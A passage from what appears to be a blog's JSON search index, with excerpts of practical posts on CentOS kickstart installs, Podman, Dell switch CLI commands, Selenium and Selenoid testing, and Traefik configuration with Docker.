        "excerpt":"First of all if you have never seen a kickstart file before and you have installed a flavor of Redhat Linux on a system go look in the /root dir you should see a file called anaconda-ks.cfg open it up and you will see the parameters you entered during your install in the kickstart file.   It is a good way to understand by example (providing you can remember the options you selected at boot time).   Below I will give you an example of a kickstart file I use it in my work with remote servers. I chose to use a kickstart install with scripts over imaging software for the Linux installs as this enabled me to use the image on various types of hardware and with the tweak of a script I could greatly customize the installs in the future. Lastly I change the configuration (update packages, settings) using Ansible playbooks after I’ve install the system.   Define the Kickstart file     With this kickstart file, we will do the following actions:     Define installation source and additional repos (minimal and standart)   Define Root Password (see here and here to manual create crypted password)   Install the OS from entirely from the network   Accept de EULA   Establish the timezone and enable NTP time synchronization on the host   Format all drives   Auto-partition the disk (two parts):            /boot part - format ext4 part with 1024MiB size       LVM part on full space of disk with next LV:                    / - 50000 MiB           /tmp - 30000 MiB           /var/log - 10000 MiB           free space - 10000 MiB                           Remove swap part   Disable kdump   Skip X Windows packages   Activate first network device that linked up   Also I like to add post section with commands that allow remote access to the new system using ssh key file:  %post /bin/mkdir /root/.ssh /bin/chmod 700 /root/.ssh /bin/echo -e 'ssh-rsa AAAAB3Nza.....9WhQ== admin@example.com' &gt; /root/.ssh/authorized_keys /bin/chown -R root:root /root/.ssh /bin/chmod 0400 /root/.ssh/*  %end   Starting the Kickstart Installation   Installing CentOS using kickstart is a 3 step process      Create the kickstart file (if you don’t already have one)   Make the kickstart file available to the boot process (e.g. put kickstart file on a web server, e.g. in github like me)   Access the boot prompt during the Centos installation and then tell the boot prompt where your kickstart file is located.  Specified by the initrd boot parameter inst.ks=&lt;YOUR_KS_CFG_DESTINATION&gt; where &lt;YOUR_KS_CFG_DESTINATION&gt; should be change to real destination.  Press ‘Tab’ button on first boot option to modify initrd boot parameter.   Ultimately you can modify the ISO file and the isolinux/isolinux.cfg and make it autostart and everything, but for this post it just wasn’t the right approach. Also you can run PXE server to automate full installation.   That’s all! Automatic Kickstart installations offer a great deal of benefits for system administrators in environments that they have to perform system installations on multiple machines the same time, in a short period of time, without the need to manually interfere with the installation process.   Additional information      RedHat - Kickstart Syntax Reference - full list of Kickstart commands and options for RHEL7 (work on RHEL8 also)   Centos - Kickstart Installations - an instruction on Centos site   How to Use Kickstart to Install CentOS 7 - useful article describes a using of Kickstart Configurator app to manual create Kickstart file   Kickstart CentOS 7 installation - good material with information about creation custom ISO file of CentOS   Automated Installations of Multiple RHEL/CentOS 7 Distributions using PXE Server and Kickstart Files - some instruction about installation RHEL with Kickstart and PXE   https://github.com/CentOS/Community-Kickstarts - a pack with many different kickstart file examples by CentOS Community   ","categories": ["linux"],
        "tags": ["centos","kickstart","linux"],
        "url": "https://gainanov.pro/eng-blog/linux/centos-installation-with-kickstart/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/centos-installation-with-kickstart.png"
      },{
        "title": "CentOS 8. Podman installation and basic usage",
        "excerpt":"Podman is a free and open-source daemonless container platform that was built to develop, manage and deploy containers and pods on a Linux environment. Pods are group of containers which are usually deployed on the same host system. Podman is gradually replacing docker which is another containerization platform that developers use to deploy their applications together with dependencies and libraries. The main difference between the two is that while docker is a daemon that can be started, enabled, stopped and restarted, podman is not. Podman is considered more secure due to its audit logging capability in containers. The auditing plays a very crucial role in monitoring the processes that are running in a container.   Docker vs Podman   The major difference between Docker and Podman is that there is no daemon in Podman. It uses container runtimes as well for example runc but the launched containers are direct descendants of the podman process.   This kind of architecture has its advantages such as the following:     Applied cgroups or security constraints still control the container:            whatever cgroup constraints you apply on the podman command, the containers launched will receive those same constraints directly.           Advanced features of systemd can be utilized using this model:            This can be done by placing podman into a systemd unit file and hence achieving more.           Installing podman on CentOS 8   To install podman on CentOS 8, simply log in as the root user and run the command:   # dnf install podman -y   Installing podman on RHEL 8   Run below command to install Podman on RHEL 8 System  # dnf module install container-tools -y   View a version   After the successful installation process , check the version of podman using the command:  $ podman --version podman version 1.4.2-stable2   Podman info   After the installation, you can display information pertaining to the host, current storage stats, and build of podman.  $ podman info host:   BuildahVersion: 1.9.0   Conmon:     package: podman-1.4.2-5.module_el8.1.0+237+63e26edc.x86_64     path: /usr/libexec/podman/conmon     version: 'conmon version 2.0.1-dev, commit: unknown'   Distribution:     distribution: '\"centos\"'     version: \"8\"   MemFree: 6229364736   MemTotal: 10473271296   OCIRuntime:     package: runc-1.0.0-60.rc8.module_el8.1.0+237+63e26edc.x86_64     path: /usr/bin/runc     version: 'runc version spec: 1.0.1-dev'   SwapFree: 0   SwapTotal: 0   arch: amd64   cpus: 6   hostname: centos   kernel: 4.18.0-147.3.1.el8_1.x86_64   os: linux   rootless: false   uptime: 26m 26.07s registries:   blocked: null   insecure: null   search:   - registry.redhat.io   - registry.access.redhat.com   - quay.io   - docker.io store:   ConfigFile: /etc/containers/storage.conf   ContainerStore:     number: 5   GraphDriverName: overlay   GraphOptions: null   GraphRoot: /var/lib/containers/storage   GraphStatus:     Backing Filesystem: xfs     Native Overlay Diff: \"true\"     Supports d_type: \"true\"     Using metacopy: \"false\"   ImageStore:     number: 5   RunRoot: /var/run/containers/storage   VolumePath: /var/lib/containers/storage/volumes   Help page   To check the help page, run the command:  $ podman --help   Also it works with subcommands:  $ podman build --help Build an image using instructions from Dockerfiles  Description:   Builds an OCI or Docker image using instructions from one or more Dockerfiles and a specified build context directory.  Usage:   podman build [flags] CONTEXT ....   Run container   Connect to the interactive session of a Container with [i] and [t] option like follows. If [exit] from the Container session, the process of a Container finishes.  podman run -it centos /bin/bash   Migrating from Docker to Podman   Migrating from Docker to Podman is very easy:     You need to install Podman instead of Docker. You do not need to start or manage a daemon process like the Docker daemon.   The commands that you use with Docker will be the same for Podman.   Images of Docker is compatible with Podman.   Podman stores its containers and images in a different place than Docker.   Conclusion   I hope this article has been useful and will help you migrate to using Podman confidently and successfully.   ","categories": ["linux"],
        "tags": ["centos","linux","podman"],
        "url": "https://gainanov.pro/eng-blog/linux/centos-posdman-installation/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/podman-logo.png"
      },{
        "title": "DELL. CLI commands",
        "excerpt":"I recently have experience in configuring a DELL PowerSwitch S4048-ON. It is 10/40GbE top-of-rack (ToR) switch built for applications in high performance data center and computing environments.   Dell’s OS9 (S &amp; Z series) switches have a minimal differences from Cisco IOS. Many commands is similar. In this quick reference I want to share a basic commands you’ll need to rely on when handling various configuration and troubleshooting tasks. The output of something commands will included.   So, here is a list of basic CLI commands which will help you manage your DELL PowerConnect series switches.   The “?”  You can use the command ? in many ways. First, use it when you don’t know what command to type. For example, type ? At the command line for a list of all possible commands.   SWP_UP_10G&gt;? clock                           Manage the system clock                  crypto                          Crypto Commands                          disable                         Turn off privileged commands             dot1x                           802.1x commands                          enable                          Turn on privileged commands              ethernet                        Ethernet commands                        exit                            Exit from the EXEC                       fsck                            Filesystem check utility                 ip                              Global IP subcommands                    ipv6                            Global IPv6 subcommands                  monitor                         Monitoring feature                       mtrace                          Trace reverse multicast path from destination to source package                         Automation package related commands      ping                            Send echo messages                       quit                            Exit from the EXEC                       show                            Show running system information          ssh                             Open a SSH connection                    ssh-peer-stack-unit             Open a SSH connection to the peer stack-unit start                           Start shell                              support-assist                  SupportAssist service                    telnet                          Open a telnet connection                 telnet-peer-stack-unit          Open a telnet connection to the peer stack-unit terminal                        Set terminal line parameters             --More--   You can also use ? When don’t know what a command’s next parameter should be. For example, you might type interface? If the router requires no other parameters for the command, the router will offer CR as the only option. Type a ? at the prompt or after a keyword. There must always be a space before the ?.   SWP_UP_10G(conf)#interface ? fortyGigE               FortyGigabit Ethernet interface          gigabitethernet         Gigabit Ethernet interface               group                   Configure interface group                loopback                Loopback interface                       managementethernet      Management Ethernet interface            null                    Null interface                           port-channel            Port-channel interface                   range                   Configure interface range                tengigabitethernet      TenGigabit Ethernet interface            tunnel                  Tunnel interface                         vlan                    VLAN interface      To see all commands that start with a particular letter. For example, show c?   SWP_UP_10G#c? cd clear clock configure copy crypto   Will return a list of commands that start with the letter c.   show running-config   The show running-config command shows the router, switch, or firewall’s current configuration. The running-configuration is the config that is in the router’s memory. You change this config when you make changes to the router. Keep in mind that that config is not saved until you do copy it to startup.   SWP_UP_10G#show running-config Current Configuration ... ! Version 9.11(0.0P3) ! Last configuration change at Mon Feb  3 18:09:01 2020 by admin ! boot system stack-unit 1 primary system: A: boot system stack-unit 1 secondary system: B: boot system stack-unit 1 default system: A: ! logging coredump stack-unit  1 logging coredump stack-unit  2 logging coredump stack-unit  3 logging coredump stack-unit  4 logging coredump stack-unit  5 logging coredump stack-unit  6 ! hostname SWP_UP_10G ! --More--   copy running-config startup-config   This command will save the configuration that is currently being modified (in RAM), also known as the running-configuration, to the nonvolatile RAM (NVRAM). If the power is lost, the NVRAM will preserve this configuration. In other words, if you edit the router’s configuration, don’t use this command and reboot the router–those changes will be lost. This command can be abbreviated copy run start.   SWP_UP_10G#copy running-config startup-config   command modes   The DELL switch like Cisco has different command modes with distinctive prompts. These modes execute different switch commands. Each mode has a set of specific commands.   To navigate and launch various CLI modes, use specific commands   Prompt         CLI Command Mode Dell&gt;          EXEC Dell#          EXEC Privilege Dell(conf)#    CONFIGURATION   Enter EXEC Privilege mode or any other privilege level configured - enable. After entering this command, you may need to enter a password.   SWP_UP_10G&gt;enable Password: SWP_UP_10G#   Enter CONFIGURATION mode from EXEC Privilege mode - configure.  SWP_UP_10G#configure SWP_UP_10G(conf)#   Return to the lower command mode - exit.  SWP_UP_10G(conf)#exit SWP_UP_10G#   The do command allows the execution of most EXEC-level commands from all CONFIGURATION levels without returning to the EXEC level.  SWP_UP_10G(conf)#do show clock        23:13:55.661 UTC Sat Jul 18 2020   command history   Display a buffered log of all commands all users enter along with a time stamp  #show command-history   device version   Some useful information about Software version and device. Display the current Dell Networking Operating System (OS) version information on the system - show version.   SWP_UP_10G#show version Dell Real Time Operating System Software Dell Operating System Version:  2.0 Dell Application Software Version:  9.11(0.0P3) Copyright (c) 1999-2017 by Dell Inc. All Rights Reserved. Build Time: Fri Jan 27 10:54:03 2017 Build Path: /build/build02/SW/SRC Dell Networking OS uptime is 6 week(s), 1 day(s), 23 hour(s), 13 minute(s)  System image file is \"system://A\"  System Type: S4048-ON Control Processor: Intel Rangeley with 3 Gbytes (3201302528 bytes) of memory, core(s) 2.  8G bytes of boot flash memory.    1 54-port TE/FG (SK-ON)  48 Ten GigabitEthernet/IEEE 802.3 interface(s)   6 Forty GigabitEthernet/IEEE 802.3 interface(s)   show interfaces   Display information on a specific physical interface or virtual interface.  SWP_UP_10G#show interfaces tengigabitethernet 1/1 TenGigabitEthernet 1/1 is up, line protocol is up Description: Hardware is DellEth, address is 14:18:77:80:11:00     Current address is 14:18:77:80:11:00 Pluggable media present, SFP+ type is 10GBASE-SR     Medium is MultiRate, Wavelength is 850nm     SFP+ receive power reading is -2.7344dBm     SFP+ transmit power reading is -2.2105dBm Interface index is 2097156 Internet address is not set Mode of IPv4 Address Assignment : NONE DHCP Client-ID :1418778022e1 MTU 1554 bytes, IP MTU 1500 bytes LineSpeed 10000 Mbit Flowcontrol rx off tx off ARP type: ARPA, ARP Timeout 04:00:00 Last clearing of \"show interface\" counters 6w1d23h Queueing strategy: fifo Input Statistics:      12063517275 packets, 16273367119685 bytes      452219597 64-byte pkts, 3344945 over 64-byte pkts, 123343574 over 127-byte pkts      994638054 over 255-byte pkts, 4755930 over 511-byte pkts, 10485215175 over 1023-byte pkts      0 Multicasts, 6533 Broadcasts, 12063510742 Unicasts   To display status information on a specific interface only, display a summary of interface information or specify a stack-unit slot and interface.   SWP_UP_10G#show interfaces status Port                 Description  Status Speed        Duplex Vlan   Te 1/1                            Up     10000 Mbit   Full   3 Te 1/2                            Up     10000 Mbit   Full   3 Te 1/3                            Up     10000 Mbit   Full   3 Te 1/4                            Up     10000 Mbit   Full   3 Te 1/5                            Up     10000 Mbit   Full   3 Te 1/6                            Up     10000 Mbit   Full   3 Te 1/7                            Up     10000 Mbit   Full   3 --More--   monitor interface   Monitor counters on a single interface or all interfaces. The screen is refreshed every five seconds and the CLI prompt disappears.  SWP_UP_10G#monitor interface te 1/1   Interface: Te 1/1, Enabled, Link is Up, Linespeed is 10000 Mbit    Traffic statistics:              Current           Rate                Delta          Input bytes:       16273367122653          0 Bps                    0         Output bytes:       13745541955640          0 Bps                    0        Input packets:          12063517303          0 pps                    0       Output packets:          10342234622          0 pps                    0          64B packets:            452219597          0 pps                    0     Over 64B packets:              3344973          0 pps                    0    Over 127B packets:            123343574          0 pps                    0    Over 255B packets:            994638054          0 pps                    0    Over 511B packets:              4755930          0 pps                    0   Over 1023B packets:          10485215175          0 pps                    0  Error statistics:      Input underruns:                    0          0 pps                    0         Input giants:                    0          0 pps                    0      Input throttles:                    0          0 pps                    0            Input CRC:                    0          0 pps                    0    Input IP checksum:                    0          0 pps                    0        Input overrun:                    0          0 pps                    0     Output underruns:                    0          0 pps                    0     Output throttles:                    0          0 pps                    0         m - Change mode                            c - Clear screen        l - Page up                                a - Page down        T - Increase refresh interval              t - Decrease refresh interval        q - Quit   show ip interface   The command provides useful information about the configuration and status of the IP protocol and its services, on all interfaces, including their IP address, Layer 2 status, and Layer 3 status.  SWP_UP_10G#show ip interface  TenGigabitEthernet 1/1 is up, line protocol is up Description: Internet address is not set IP MTU is 1500 bytes Directed broadcast forwarding is disabled Proxy ARP is enabled Split Horizon is enabled Poison Reverse is disabled ICMP redirects are not sent ICMP unreachables are not sent IP unicast RPF check is not supported  --More--   Or with defined name of interface  SWP_UP_10G#show ip interface managementethernet 1/1  ManagementEthernet 1/1 is up, line protocol is up Internet address is 192.168.1.1/24 Virtual-IP address is not set Broadcast address is 192.168.1.255 Address determined by user input   configure interface   Configure a physical or virtual interface on the switch.  SWP_UP_10G#conf SWP_UP_10G(conf)#interface tengigabitethernet 1/1 SWP_UP_10G(conf-if-te-1/1)#   Before configuring should be useful view a current settings for the interface  SWP_UP_10G(conf-if-te-1/1)#show config ! interface TenGigabitEthernet 1/1  no ip address  switchport  no shutdown   no shutdown   To disable, delete or return to default values, use the no form of the commands. The no shutdown command enables an interface (brings it up). This command must be used in interface configuration mode. It is useful for new interfaces and for troubleshooting. When you’re having trouble with an interface, you may want to try a shut and no shut.   arp &amp; mac table   For displaying the ARP table use show arp or show arp interface te 1/1 for specific interface.  SWP_UP_10G#show arp  Protocol    Address         Age(min)  Hardware Address    Interface      VLAN             CPU --------------------------------------------------------------------------------------------- Internet    172.16.1.1            6   64:00:6a:d8:00:00   Po 1           Vl 4             CP Internet    172.16.1.2            -   14:18:77:80:00:01        -         Vl 4             CP Internet    172.16.1.3            0   a0:36:9f:d8:00:02   Po 1           Vl 4             CP   Display the MAC address table.  SW_DWN_1G#show mac-address-table Codes: *N - VLT Peer Synced MAC *I - Internal MAC Address used for Inter Process Communication  VlanId     Mac Address           Type          Interface        State  3      00:0c:29:41:01:00       Dynamic         Gi 1/9          Active  3      00:0c:29:dd:01:00       Dynamic         Gi 1/9          Active  3      00:1e:67:f0:02:00       Dynamic         Gi 1/40         Active --More--   show vlan   Display the current VLAN configurations on the switch - show vlan.  SWP_UP_10G#show vlan  Codes: * - Default VLAN, G - GVRP VLANs, R - Remote Port Mirroring VLANs, P - Primary, C - Community, I - Isolated        O - Openflow, Vx - Vxlan Q: U - Untagged, T - Tagged    x - Dot1x untagged, X - Dot1x tagged    o - OpenFlow untagged, O - OpenFlow tagged    G - GVRP tagged, M - Vlan-stack    i - Internal untagged, I - Internal tagged, v - VLT untagged, V - VLT tagged      NUM    Status    Description                     Q Ports *   1      Inactive                                       3      Active    C-MGMT                          T Po1(Te 1/47-1/48)     4      Active    C-DATA                          T Po1(Te 1/47-1/48)                                                      U Te 1/1-1/28,1/30-1/46   current time   Display the current clock settings.  SWP_UP_10G#show clock detail 18:04:16.792 UTC Mon Feb 3 2020 Time source is RTC hardware   Conclusion   In summary, the key differences between Dell and Cisco are the approach they take to where the untagging and tagging happens (Cisco: interface, Dell: VLAN), how the trunks allow VLANs and how dell OS9 does not have any form of Spanning tree by default. But other than that the CLI commands are very similar and any engineer familiar with Cisco will no problem using Dell OS9.   Additional information      Cisco Commands Cheat Sheet - cisco commands in one page   Dell Command Line Reference Guide for the S4048–ON System 9.14.0.0 - dell man page included full command list   DELL EMC NETWORKING S4048-ON SWITCH - dell spec sheet for S4048–ON switch   ","categories": ["sysad"],
        "tags": ["dell","cisco","networks"],
        "url": "https://gainanov.pro/eng-blog/sysad/dell-switch-console-commands/",
        "teaser": null
      },{
        "title": "Web Automation. Selenium WebDriver and Python",
        "excerpt":"Selenium is a Web Browser Automation Tool. Primarily, it is for automating web applications for testing purposes, but is certainly not limited to just that. It allows you to open a browser of your choice &amp; perform tasks as a human being would, such as:     Clicking buttons   Entering information in forms   Searching for specific information on the web pages   Setup and tools   I’m assuming you know how to use pip and virtual environments. If not, start here.   install selenium using pip   pip install selenium   install chrome driver   You will also need the Google Chrome Driver found here. If you run into an error: chromedriver executable needs to be in PATH, you have a few options. First, add chromedriver to your system path variables. Second, add chromedriver.exe to your Scripts folder of the virtual environment. Third, explicitly give the location of the driver.   initiate the driver   I will use MacOS and the last option that explicitly point to chromedriver. So, for using webdriver open Python console or create py-file and insert initialization commands:   from selenium import webdriver driver = webdriver.Chrome(executable_path='./chromedriver')   Let’s Automate   First Script   Our first example will be simple. The script will open a browser, input some URL (https://www.google.com) and get title of the loaded site. Returned title will print into console.   from selenium import webdriver  chrome = webdriver.Chrome(executable_path='./chromedriver') chrome.get('https://www.google.com') print(chrome.title) chrome.quit()   More action   You can find proper documentation on selenium here.   Following methods will help to find elements in a webpage (these methods will return a list):     find_elements_by_name   find_elements_by_xpath   find_elements_by_link_text   find_elements_by_partial_link_text   find_elements_by_tag_name   find_elements_by_class_name   find_elements_by_css_selector   search in google   Once we make a request and it is successful we need to get a response. With response we can make some actions for example input a search string.   from selenium import webdriver from selenium.webdriver.common.keys import Keys  chrome = webdriver.Chrome(executable_path='./chromedriver')  chrome.get(\"https://www.google.com\") element = chrome.find_element_by_xpath('//input[@name=\"q\"]') element.click() element.send_keys('site:gainanov.pro Web Automation: Selenium WebDriver and Python') element.send_keys(Keys.RETURN)  chrome.quit()   XPaths allow the script to determine the exact web element you want. In the XPath, double forward slash (//) means find an element anywhere on the page. The star (*) means find any element. The @ sign specifies the attribute you want. In this case, I wanted input element with attribute name=”q” - //input[@name=\"q\"].   Once you grab a web element, you can act with elements. For example, I send a search phrase and press return key with send_keys method.   Read the documentation and examples, you can search by XPath or by other means.   waiting   Selenium Webdriver provides two types of waits - implicit &amp; explicit. An explicit wait makes WebDriver wait for a certain condition to occur before proceeding further with execution. An implicit wait makes WebDriver poll the DOM for a certain amount of time when trying to locate an element.   Change the row with find_element_by_xpath method to new the method with explicit waits.  from selenium import webdriver from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC  # ... element = WebDriverWait(chrome, 10).until(         EC.visibility_of_element_located((By.XPATH, \"//input[@name='q']\"))) # ...  This waits up to 10 seconds before throwing a TimeoutException unless it finds the element to return within 10 seconds.   An implicit wait tells WebDriver to poll the DOM for a certain amount of time when trying to find any element (or elements) not immediately available. The default setting is 0. Once set, the implicit wait is set for the life of the WebDriver object.  chrome.implicitly_wait(10) # seconds   Conclusion   You now have the foundational skills necessary to scrape websites and automate test a web interface. But this solution can be run only on local environment. For the best performance and remote testing read my next post. It will include materials about Selenoid can help you save time to run parallel scripts remote.   Thank you for reading.   Additional information      What is Selenium? Getting started with Selenium Automation Testing - good explanation from Edureka education platform   How to Get Started with XPath in Selenium – XPath Tutorial - Getting started XPath   Selenium with Python - Selenium library for Python   ","categories": ["dev"],
        "tags": ["python","selenium","testing","scrapping","QA"],
        "url": "https://gainanov.pro/eng-blog/dev/selenium-python/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/selenium/selenium_python_logo.png"
      },{
        "title": "Selenoid. Selenium in Docker",
        "excerpt":"My previous post will include a introduction into writing tests with Selenium. In this I want to share you my experience with Selenoid. And we create a test environment that help us to run the tests remotely in Docker.   Selenoid Grid   Selenoid Grid or simple Selenoid is a robust implementation of the Selenium Hub using Docker containers to launch browsers. No need to manually install browsers or dive into WebDriver documentation. Any browser session can be saved to the H.264 video. An API to list, download, and delete saved log files. Suitable for personal usage and in big clusters.     Consumes 10 times less memory than Java-based Selenium server under the same load   Small 6 Mb binary with no external dependencies (no need to install Java)   Browser consumption API working out of the box   Ability to send browser logs to centralized log storage   Fully isolated and reproducible environment      Selenoid Grid composition   Selenoid should be used with two components:     Selenoid - Selenium Hub successor running browsers within containers.   Selenoid-ui - Graphical user interface for Selenoid project and check run time browsers and logs.   Now let’s create a simple Grid by using Selenoid Images with Docker on the local machine and you can run Test cases.   Prerequisite   Docker should be installed on your machine where you want to run this Selenium Grid.   Quick Start Guide   Create a DockerCompose File   docker-compose file is a configuration file for docker, by using the compose files its easy to create and stop Containers. We are creating 2 services selenoid and selenoid-ui in docker-compose.yml file, which will run as 2 containers. You can read official documentation of docker compose file.   Let’s create a docker-compose.yml file in you local system.  version: '3' services:   selenoid:     image: \"aerokube/selenoid\"     network_mode: bridge     restart: always     ports:       - \"4444:4444\"     volumes:       - \"$PWD:/etc/selenoid/\" # assumed current dir contains browsers.json       - \"/var/run/docker.sock:/var/run/docker.sock\"   selenoid-ui:     image: \"aerokube/selenoid-ui\"     network_mode: bridge     restart: always     links:       - selenoid     ports:       - \"8080:8080\"     command: [\"--selenoid-uri\", \"http://selenoid:4444\"]   Create browsers.json   Using the docker-compose file we have to pass the browsers using a Json file. browsers.json file contains all the browsers and their version we want to run in the Selenoid Grid. In our JSON file we are defining two last versions for both browsers - Chrome and Firefox. We define VNC and non-VNC version. VNC allows to see and interact with browser at real time and you can check the logs from the container which is showing all the actions. But it has required additional resource consumption. Different default locales will help us to get more predictable results.   Let’s create a browsers.json file in the current directory where docker-compose.yml file is present.  {     \"firefox\": {         \"default\": \"72.0\",         \"versions\": {             \"72.0_VNC\": {                 \"image\": \"selenoid/vnc:firefox_72.0\",                 \"port\": \"4444\",                 \"path\": \"/wd/hub\",                 \"env\" : [\"TZ=Europe/Moscow\", \"LANG=ru_RU.UTF-8\", \"LANGUAGE=ru:en\", \"LC_ALL=ru_RU.UTF-8\"]             },             \"72.0\": {                 \"image\": \"selenoid/firefox:72.0\",                 \"port\": \"4444\",                 \"path\": \"/wd/hub\",                 \"env\" : [\"TZ=Europe/Moscow\", \"LANG=ru_RU.UTF-8\", \"LANGUAGE=ru:en\", \"LC_ALL=ru_RU.UTF-8\"]             }         }     },     \"chrome\": {         \"default\": \"80.0\",         \"versions\": {             \"80.0\": {                 \"image\": \"selenoid/chrome:80.0\",                 \"port\": \"4444\",                 \"path\": \"/\",                 \"env\" : [\"TZ=Europe/Moscow\", \"LANG=ru_RU.UTF-8\", \"LANGUAGE=ru:en\", \"LC_ALL=ru_RU.UTF-8\"]             },             \"80.0_VNC\": {                 \"image\": \"selenoid/vnc:chrome_80.0\",                 \"port\": \"4444\",                 \"path\": \"/\",                 \"env\" : [\"TZ=Europe/Moscow\", \"LANG=ru_RU.UTF-8\", \"LANGUAGE=ru:en\", \"LC_ALL=ru_RU.UTF-8\"]             }         }     } }   What is Selenoid UI   Selenoid UI is also a very cool feature in the Selenoid project where we can see the Live Test Running on multiple containers. If you look closely in to the composer file above the selenoid-ui service is running on port 8080 and linked with the selenoid service.   So if we run the docker compose file above the docker container will start both the service by default. We can access the UI using the URL: localhost:8080   Start the Selenoid Grid   Starting the Selenoid Grid is very easy and simple by using the docker-compose file we have made in above steps. Let’s run the following command from where our docker-compose.yml file is present:   docker-compose up -d   After running the docker compose command, Docker will automatically download the proper images of selenoid before starting the container. But sometimes you have to manually download defined browser images.   docker pull selenoid/chrome:80.0 docker pull selenoid/firefox:72.0 docker pull selenoid/vnc:chrome_80.0 docker pull selenoid/vnc:firefox_72.0   As Selenoid Hub which is running on 4444 port will receive the request and create a container with the browser asked from Test script and will kill the container after the Test.   Create tests   With the previous article we already learn how to run a simple tests with Python. Let’s create a new one. We will connect it to our remote Selenoid Hub by localhost network.   Open Python interpreter and copy next commands:  from selenium import webdriver from selenium.webdriver.common.desired_capabilities import DesiredCapabilities  chrome = webdriver.Remote(           command_executor='http://localhost:4444/wd/hub',           desired_capabilities=DesiredCapabilities.CHROME) firefox = webdriver.Remote(           command_executor='http://localhost:4444/wd/hub',           desired_capabilities=DesiredCapabilities.FIREFOX)  chrome.get('https://www.google.com') print(chrome.title)  firefox.get('https://www.google.com') print(firefox.title)  chrome.quit() firefox.quit()   If we run it, we could view two sessions in Selenoid UI available at the link: http://localhost:8080/      If we talk about simultaneous testing on different devices, e.g: we have a cross-platform web app with a real-life chat function, we can simultaneously test the interaction between them, that is obviously comfortable.   Conclusion   Solution on the basis of Selenium in Docker demonstrates high flexibility for configuration of the runtime environment. The stability of this solution, significant time savings when using it and a number of additional features allow us to optimize the process and ensure high-quality software products in a short time. As a result, it allow us to perform test automation tasks quickly and accurately.   Here you can download the fully configured project and play with it.   Happy testing!   Additional information      Aerokube. Efficient Selenium Testing Infrastructure - the start page to explore automation testing   Selenium with Python - Selenium library for Python   ","categories": ["devops"],
        "tags": ["python","selenium","testing","selenoid","docker","QA"],
        "url": "https://gainanov.pro/eng-blog/devops/selenium-in-docker-with-selenoid/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/selenium/selenoid_logo.png"
      },{
        "title": "Traefik. Concept term explanation",
        "excerpt":"Traefik is an open-source Edge Router that makes publishing your services a fun and easy experience. It receives requests on behalf of your system and finds out which components are responsible for handling them.   Traefik perfectly bound with Docker engine, just attach labels to your containers and let Traefik do the rest!      But if are new in Traefik you will have some difficulties to understand what does it mean all this specific words. In here I would like to explain the basic definition of them. Let’s start.   Provider   Traefik is able to use your cluster API to discover the services and read the attached information. In Traefik, these connectors are called Providers because they provide the configuration to Traefik. The idea is that Traefik will query the providers’ API in order to find relevant information about routing, and each time Traefik detects a change, it dynamically updates the routes.   To define a connection with docker add next parameter to a traefik command:  --providers.docker=true   EntryPoint   EntryPoints are the network entry points into Traefik. They define the port which will receive the requests (whether HTTP or TCP). EntryPoints are part of the static configuration. You can define them using a toml file, CLI arguments, or a key-value store.   For example  --entryPoints.web.address=:80 --entryPoints.websecure.address=:443     Two entrypoints are defined: one called web, and the other called websecure.   web listens on port 80, and websecure on port 443.   Router   The main function is a connecting Requests from EntryPoint to Services.   Router is in charge of connecting incoming requests to the services that can handle them. In the process, routers may use pieces of middleware to update the request, or act before forwarding the request to the service.   Configuration example  --traefik.http.routers.whoami.entrypoints=web --traefik.http.routers.whoami.rule=Host(`whoami.localhost`)     The router has name whoami and will get requests from web entrypoint.   Defined rule Host('whoami.localhost') will allow only requests for domain ‘whoami.localhost’   Rule  Rules are a part of Router. In detail it is a set of matchers configured with values, that determine if a particular request matches specific criteria. If the rule is verified, the router becomes active, calls middlewares, and then forwards the request to the service.   rule = \"Host(`traefik.io`) || (Host(`containo.us`) &amp;&amp; Path(`/traefik`))\"   Middleware   Middleware needs for tweaking the Request. Attached to the routers, pieces of middleware are a means of tweaking the requests before they are sent to your service (or before the answer from the services are sent to the clients).   There are several available middleware, some can modify the request, the headers, some are in charge of redirections, some add authentication, and so on. The middlewares will take effect only if the route rule matches, and before forwarding the request to the service.      Example of creating and attaching a middleware (add BasicAuth to the Service):  --traefik.http.routers.api.rule=Host(`traefik.example.com`) --traefik.http.routers.api.service=api@internal --traefik.http.routers.api.middlewares=auth --traefik.http.middlewares.auth.basicauth.users=user:$$apr1$$mW/l73Bf$$Wsprk23sa5.QbLdY3sak7hf0\"     Firs of all we create a route api with rule that will pass traffic only for traefik.example.com domain   We attach an internal traefik service to this route - api@internal   Also we attach a middleware auth that we explain in the next row   The new middleware has name auth. It’s a BasicAuth middleware. It To create a user:password pair, the following command can be used:     # echo $(htpasswd -nb user password) | sed -e s/\\\\$/\\\\$\\\\$/g           Service   Services are responsible for configuring how to reach the actual services that will eventually handle the incoming requests.   Each request must eventually be handled by a service, which is why each router definition should include a service target, which is basically where the request will be passed along to.   To define a usage of the specific port  --traefik.http.services.myapp.loadbalancer.server.port=8082     The service myapp will income requests between servers that listen on port 8082   In the next post will show you how to use Traefik with Docker containers.   Additional information      Official Documentation - the start point to know more about Traefik   Traefik 2.0 &amp; Docker 101 - tips &amp; tricks the Documentation Doesn’t Tell You   ","categories": ["devops"],
        "tags": ["devops","traefik","router","docker"],
        "url": "https://gainanov.pro/eng-blog/devops/docker-traefik-concept-terms-explanation/",
        "teaser": null
      },{
        "title": "Docker. Create secure web service using Let's Encrypt with Traefik",
        "excerpt":"In my previous post I speak about Traefik concepts and designs. I explain the main words used in Traefik as Endpoint, Router, Rule and etc. So in here I will concentrate only on practice.      What We’ll Do     We’ll use a pre-made container — containous/whoami — capable of telling you where it is hosted and what it receives when you call it.   We’ll deploy that container through traefik proxy using docker-compose.   We’ll define a dashboard that shows us all deployed services.   We’ll setup letsencrypt configures that will automatically get and update free SSL certificates.   We’ll configure proxy to redirect all insecure requests to https scheme.   Prerequisite  You have installed a Docker and docker-compose. We will use Traefik 2.1   Repository  All presented compose files has stored in this Github Repository.   1. Use traefik as proxy   This basic configuration will be a start point to run traefik with docker.   version: '3'  services:   traefik:     image: traefik:v2.1     container_name: traefik     command:       # Enable dashboard       - --api.dashboard=true       # Allow use API and dashboard though insecure       - --api.insecure=true       # Use docker as provider       - --providers.docker=true       # Enable log income requsts       - --accesslog=true       # Set log level (default ERROR)       - --log.level=ERROR       # Define entrypoint that listens 80 port       - --entryPoints.web.address=:80     ports:       # The HTTP port       - \"80:80\"       # The Web UI (enabled by --api.insecure=true)       - \"8080:8080\"     